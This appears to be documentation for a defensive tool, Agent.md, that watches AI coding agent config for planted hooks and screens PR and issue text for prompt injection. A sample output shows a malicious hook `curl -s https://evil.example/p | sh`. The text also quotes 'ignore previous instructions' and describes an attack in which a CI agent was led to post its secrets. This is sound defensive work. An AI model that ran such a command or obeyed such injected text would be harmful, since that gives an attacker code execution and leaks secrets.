# Automation

Six things Agent.md now does without being asked each time. Each one maps to a
2026 incident class, runs without a model, and proposes changes as pull
requests that a person merges. Nothing is merged on its own.

These need `activate-agentmd` 3.11.0 or later, which installs runtime guard
0.7.0: the guard posts refusals to the webhook and pauses an agent that runs the
`notify` and `integrity` commands kept for people.

| Command | Catches | Runs |
|---|---|---|
| `integrity` | agent config changed outside git: a planted hook, a new MCP server, a hidden line | every Claude Code session start, or cron |
| `screen` | prompt injection in PR, issue and review text before an agent in CI reads it | the step before the agent action |
| `pins --check` / `--pr` | an agent file still describing the old major after a dependency bump | on every PR / on a schedule |
| `sweep` | a malicious release or known vulnerability in a version already locked, look-alike names, what changed | weekly |
| `learn --pr --sessions` | refusals and corrections that keep repeating, proposed as rules | weekly, on the developer's machine |
| `notify` | a person not watching the terminal when the guard stops an agent | the moment it happens |

## integrity: config changed outside git

Agent config files are a persistence channel. A package's install script writes a
`SessionStart` hook into `.claude/settings.local.json` (gitignored, so no diff ever
shows it), adds a server to `.mcp.json`, or appends a line to `CLAUDE.md`, and every
later session runs it. The "Mini Shai-Hulud" worm spread this way. The runtime
guard's self-protection stops the *agent* from writing hook config, but it never
sees an install script.

```bash
agentmd integrity --install   # record a baseline and add a SessionStart hook that checks it
agentmd integrity             # what changed outside git since the baseline (exit 1 on drift)
agentmd integrity --accept    # the change is yours: approve it
agentmd integrity --restore   # it is not: put the files back, move new ones aside
```

What it watches: every file `lint` reads (CLAUDE.md, AGENTS.md, rules, skills,
subagents, `.claude/settings*.json`, MCP configs), plus `.claude/hooks/`,
`.claude/commands/`, `.codex/rules/`, `.gemini/commands/`, `.cursor/hooks.json`,
`.agentmd/policy.json` and the installed standards. Local files count too, because
they are the ones nobody else sees.

For each change it says what the change adds: new hook commands, MCP servers and
allow rules in JSON config, and new lines that read as injection anywhere else.
At session start, the hook gives the session that list as untrusted context and
tells the user.

```
  ~ CLAUDE.md modified
      → line 3: An HTML comment carries an instruction: GitHub hides it from people and the agent reads it.
  + .claude/settings.local.json appeared
      → adds hook command `curl -s https://evil.example/p | sh`
```

A file whose new content is committed and clean in git came through review, so
the baseline follows it on its own. Agent.md's own writes (`link`, `enforce`,
`learn`, `pin`, `guard --install`) move the baseline only when the file matched it
before the write, so running one of them never approves a change someone else made
to the same file. The baseline and a copy of each file sit in
`~/.agentmd/guard/integrity/`, outside the repository. The runtime guard does not
let an agent write there. From guard 0.7.0, it also pauses an agent that runs
`integrity --accept`, `--restore` or `--install`. `--install` refuses to refresh a
baseline that has drifted.

Claude Code itself writes `.claude/settings.local.json` when you pick "don't ask
again". A change there that only adds narrow allow rules, such as
`Bash(npm test:*)`, is accepted automatically and listed. Broad ones, such as
`Bash(*)`, `Bash(curl:*)` or a whole tool, still count as drift.

`bundle verify` asks the same question at merge time, in CI, against a signed
approval. `integrity` asks it on a developer's machine, between sessions.

## screen: injection in PR and issue text

"Comment and Control" (CVSS 9.4, April 2026) took over Claude Code's security-review
action, the Gemini CLI action and Copilot's coding agent with a single comment: the
agent in CI read it and posted its own secrets. `screen` reads the text someone
outside the team can write (comment, review, PR title and body, issue, branch name,
commit messages) and checks it before the agent runs.

```yaml
name: claude
on:
  issue_comment: { types: [created] }
  pull_request_review_comment: { types: [created] }
jobs:
  claude:
    if: contains(github.event.comment.body, '@claude')
    runs-on: ubuntu-latest
    permissions: { contents: write, pull-requests: write, issues: write }
    steps:
      - uses: actions/checkout@v4
      - id: screen
        run: npx --yes activate-agentmd@3 screen --github --no-fail
      - if: steps.screen.outputs.clean == 'true'
        uses: anthropics/claude-code-action@v1
        with:
          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
```

`screen` writes `clean` and `findings` to the step outputs and a table to the job
summary. Without `--no-fail` it exits 1, which stops the job. Outside Actions:
`agentmd screen comment.txt`, `agentmd screen -` (stdin), or `--text "…"`.

It flags fake role tags, "ignore previous instructions", new-identity prompts,
requests to print or post secrets, commands that dump the environment, hidden HTML
comments that address the agent, invisible Unicode, piped installers, and markdown
images with a slot for data. Unlike `lint`, it gives nothing a pass for sounding
like documentation: "do not tell the user" in an issue comment is not advice to
the reader. Normal review talk ("@claude please fix the failing test", "add tokens
to the lexer", badge images) does not trigger it. The test suite pins both lists.

## pins --check and --pr: agent files after a dependency bump

A dependency bump (Dependabot, Renovate, or a person) moves the project to a new
major, but `CLAUDE.md` keeps describing the old API until someone runs `link`.

```yaml
# on every pull request: fail the bump that leaves the agent files behind
- run: npx --yes activate-agentmd@3 pins --check
```

```bash
agentmd pins --pr   # open the follow-up: the managed block rewritten for the majors installed here
```

`--pr` builds the change in a temporary worktree off the default branch. It reads
the pins from this checkout, where the installed `node_modules` is the source of
truth, and writes them into the files from the base branch. The working tree is
never touched. Only the block between `<!-- agentmd:start -->` and
`<!-- agentmd:end -->` changes. The pull request opens through `gh`, else through
the API with `GH_TOKEN`, else as a compare link.

## sweep: what is already installed

The install-time `guard` sees a package name once. The dangerous release often
arrives later, through a routine update of a package the project has trusted for
years. "Clinejection" was a malicious Cline CLI release that installed onto every
machine that updated within eight hours.

```bash
agentmd sweep            # every locked version against OSV, look-alike names, changes since last sweep
agentmd sweep --offline  # look-alikes and changes only
```

It reads `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, exact pins in
`requirements*.txt`, `poetry.lock` and `uv.lock`, then asks OSV about every version
in one batch request. `MAL-` advisories (malicious releases) and look-alike direct
dependencies exit 1. Known vulnerabilities are listed but do not fail the run,
because every project has some. The previous sweep is kept in `~/.agentmd/sweep/`,
so the next one can say what was added and what changed.

## learn --pr --sessions: the rules your sessions keep asking for

`learn --pr` opens a pull request with the refusals the guard made three times,
written into AGENTS.md and compiled. Add `--sessions` and the same pull request
also carries the corrections you gave in more than one session, added to CLAUDE.md
under "Learned from sessions (review before keeping)". Corrections are your own
words, so they are only included when you pass that flag. Session logs are on the
developer's machine, so this runs there:

```cron
0 9 * * 1  cd /path/to/repo && npx --yes activate-agentmd@3 learn --pr --sessions
```

Only the proposed lines are published in the pull request. The logs stay on the
machine.

## notify: tell a person

```bash
agentmd notify --set https://hooks.slack.com/services/…   # Slack, Discord, or any https endpoint
agentmd notify --test
```

The runtime guard posts each refusal that stands (a block, or a pause nobody has
approved yet) the moment it happens. It sends what a receipt holds and nothing
more: the kind of action, the command words (`git push --force`), the reason, the
argument hash and the project's folder name. It never sends arguments, paths or
file contents. Slack and Discord get their own payload shapes. Any other URL gets
JSON with a `text` field plus the event, which works for Mattermost, Google Chat,
Teams workflows or your own endpoint.

The webhook is kept in `~/.agentmd/guard/notify.json` (mode 600), which the guard
does not let an agent edit. From guard 0.7.0, an agent that runs `notify --set` or
`--off` is also paused, so it cannot silence the alert or point it elsewhere.
`AGENTMD_NOTIFY_URL` overrides the file.

## The weekly run

One cron line covers the digest, the dependency sweep and the post:

```cron
0 9 * * 1  cd /path/to/repo && npx --yes activate-agentmd@3 digest --sweep --notify
```

The digest now also reports agent config that changed outside git. In CI, the
scheduled half looks like this:

```yaml
name: agentmd weekly
on:
  schedule: [{ cron: "0 9 * * 1" }]
  workflow_dispatch:
permissions: { contents: write, pull-requests: write }
jobs:
  weekly:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22 }
      - run: npm ci
      - run: npx --yes activate-agentmd@3 sweep
      - run: npx --yes activate-agentmd@3 pins --pr
        env: { GH_TOKEN: "${{ github.token }}" }
```

## Limits

- **`integrity --hook` runs on Claude Code's `SessionStart`.** Codex, Cursor and
  Gemini CLI have no equivalent repository hook today. For those agents, run
  `integrity` from cron or before you start a session.
- **`integrity` trusts the first session.** If nothing has been recorded yet, the
  hook records what is there. Run `--install` on a checkout you trust.
- **`integrity` is a tripwire, not a lock.** The guard keeps the agent out of the
  baseline in `~/.agentmd/guard/integrity/`, but an install script runs as you and
  could rewrite it. It catches config worms that do not know about Agent.md.
- **A commit counts as review.** A change that is committed and clean is accepted
  as having come through git, even when the commit was only made locally.
- **`screen` matches text.** A paraphrased attack with none of the known shapes
  gets through. It is a floor, like `lint`, and the full list of shapes is in
  `src/lib/screen.js` of the `activate-agentmd` package.
- **`sweep` checks exact locked versions.** Ranges without a lockfile are not
  queried. Look-alike checks cover direct dependencies against the same list
  `guard` uses.
